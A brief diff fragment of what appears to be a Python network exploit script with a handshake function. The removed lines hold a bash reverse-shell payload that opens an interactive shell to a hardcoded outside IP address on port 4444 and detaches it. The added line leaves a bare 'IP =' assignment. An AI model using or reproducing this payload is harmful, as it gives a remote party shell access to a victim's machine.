@@ -4,8 +4,7 @@ import socket
 import re
 import time
 
-IP
-payload = "bash -i >& /dev/tcp/104.236.240.31/4444 0>&1 & disown"
+IP =
 
 
 def handshake(key,chall):
